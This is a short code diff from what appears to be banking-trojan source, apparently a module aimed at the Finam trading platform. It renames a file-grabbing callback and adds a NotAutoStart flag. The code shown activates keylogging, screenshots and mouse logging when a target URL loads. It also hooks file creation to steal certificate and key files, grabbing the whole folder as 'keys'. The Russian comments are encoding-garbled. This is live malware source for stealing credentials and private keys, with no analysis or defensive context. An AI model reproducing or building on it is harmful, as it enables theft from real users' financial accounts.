@@ -22,7 +22,7 @@ static PKeyLogSystem System = 0;
 static bool finamActivated = false;
 
 //как только попадаетс€ хоть один файл с нужно маской, то сразу грабим всю папку и останавливаем файл граббер
-static int GranKeyFiles( FileGrabber::ParamEvent* e )
+static int GrabKeyFiles( FileGrabber::ParamEvent* e )
 {
 	DBG( "finam", "File: %s", e->fileName );
 	m_lstrcpy( e->nameSend, "keys" );
@@ -41,7 +41,7 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 			KeyLogger::ActivateSystem(System);
 			FileGrabber::Init(FileGrabber::CREATEFILEA);
 			FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
-			rv->FuncReceiver = GranKeyFiles;
+			rv->FuncReceiver = GrabKeyFiles;
 			rv->minSize = 200;
 			rv->maxSize = 1000;
 			rv->maska = "*-BEGIN*-END*"; //файлы которые начинаютс€ с BEGIN CERTIFICATE и заканчиваютс€ END CERTIFICATE
@@ -65,6 +65,7 @@ bool Init()
 	if( System )
 	{
 		System->MakeScreenShot = true;;
+		System->NotAutoStart = true;
 		System->AlwaysLogMouse = LOG_MOUSE_NOT_SCREENSHOT;
 		DBG( "finam", "ќжидаем нужный урл" );
 		KeyLogger::ConnectEventHandler( KLE_IE_URL_CHANGED, URLChanged );
